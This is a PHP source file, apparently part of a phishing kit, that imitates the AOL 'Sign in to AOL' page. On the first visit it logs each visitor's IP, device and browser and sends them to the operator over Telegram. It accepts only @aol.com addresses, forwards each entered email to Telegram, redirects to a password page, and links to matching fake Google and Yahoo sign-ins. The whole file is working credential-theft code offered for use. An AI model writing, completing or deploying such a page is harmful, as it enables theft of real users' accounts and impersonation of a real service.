<?php
// index.php — AOL Page 1: Email / phone entry
require 'config.php';
require 'helpers.php';
session_start();

// Unique visitor ID
if (empty($_SESSION['visitor_id'])) {
    $_SESSION['visitor_id'] = bin2hex(random_bytes(16));
}
$sid = $_SESSION['visitor_id'];
$ua  = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$dev = detect_device($ua);

// Telegram first-visit notification
if (empty($_SESSION['tg_notified'])) {
    $_SESSION['tg_notified'] = true;
    set_state($sid, [
        'page' => 'email', 'ip' => $_SERVER['REMOTE_ADDR'] ?? '?',
        'device_os' => $dev['os'], 'device_browser' => $dev['browser'],
        'device_type' => $dev['type'], 'device_ua' => $ua,
        'created' => date('H:i:s d/m/Y'),
    ]);
    tg_send(
        "🟡 <b>NEW AOL VISITOR</b>\n\n" .
        "🆔 ID: <code>{$sid}</code>\n" .
        "🌐 IP: <code>" . ($_SERVER['REMOTE_ADDR'] ?? '?') . "</code>\n" .
        "📱 Device: {$dev['type']}\n" .
        "💻 OS: {$dev['os']}\n" .
        "🌍 Browser: {$dev['browser']}\n" .
        "⏰ Time: " . date('H:i:s d/m/Y') . "\n\n" .
        "⏳ Waiting for email/phone..."
    );
}

$error     = '';
$field_err = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');

    if ($email === '') {
        $error     = 'Whoops, something went wrong.';
        $field_err = true;
    } elseif (!preg_match('/^[^@\s]+@aol\.com$/i', $email)) {
        // ── ONLY @aol.com accepted ──
        $error     = 'Whoops, something went wrong.';
        $field_err = true;
    } else {
        $_SESSION['email'] = $email;
        set_state($sid, ['page' => 'password', 'email' => $email]);
        tg_send(
            "📧 <b>AOL Email Entered</b>\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n\n" .
            "➡️ Moving to password page..."
        );
        header('Location: password.php');
        exit;
    }
}

page_open('Sign in to AOL');
?>

<div class="card">
  <h1 class="card-title">Sign in to AOL</h1>

  <form method="POST" id="emailForm" novalidate>

    <label class="field-label <?= $field_err ? 'err-label' : '' ?>" for="emailInput">
      Email or phone number
    </label>

    <div class="aol-field">
      <input type="text" name="email" id="emailInput"
             class="aol-input <?= $field_err ? 'err' : '' ?>"
             value="<?= htmlspecialchars($_POST['email'] ?? '') ?>"
             autocomplete="email" inputmode="email" />
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= htmlspecialchars($error) ?></div>
    <?php else: ?>
      <div class="err-text" id="emailErr"></div>
    <?php endif; ?>

    <!-- Stay signed in + Forgot username -->
    <div style="display:flex;align-items:center;justify-content:space-between;margin-top:4px">
      <label class="cb-row" style="margin:0">
        <input type="checkbox" name="stay" id="stayCb" />
        <span class="cb-label">Stay signed in</span>
      </label>
      <a href="#" class="aol-link" style="font-size:13px"></a>
    </div>

    <button type="submit" class="btn-aol">Next</button>

    <div class="or-divider">or</div>

    <!-- Google sign-in — no underline on the wrapping anchor -->
    <a href="../gmail" style="text-decoration:none;display:block;margin-bottom:10px">
      <button type="button" class="btn-social" style="margin-bottom:0">
        <svg width="18" height="18" viewBox="0 0 24 24">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        Sign in with Google
      </button>
    </a>

    <!-- Yahoo sign-in — no underline on the wrapping anchor -->
    <a href="../yahoo" style="text-decoration:none;display:block;margin-bottom:10px">
      <button type="button" class="btn-social" style="margin-bottom:0">
        <svg width="18" height="18" viewBox="0 0 24 24">
          <path fill="#6001D2" d="M0 0h8.5L12 7.9 15.5 0H24l-8 16.2V24h-8v-7.8Z"/>
        </svg>
        Sign in with Yahoo
      </button>
    </a>

    <div class="create-account">
      <a href="https://login.aol.com/account/create?intl=us&src=fp-us&activity=default&pspid=1197803361&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DtXxb9TMoyxS24wCEkrcSPq5uJYXNBt4u%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bguce-w%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&specId=yidregsimplified">Create account</a>
    </div>

  </form>
</div>

<?php page_close(); ?>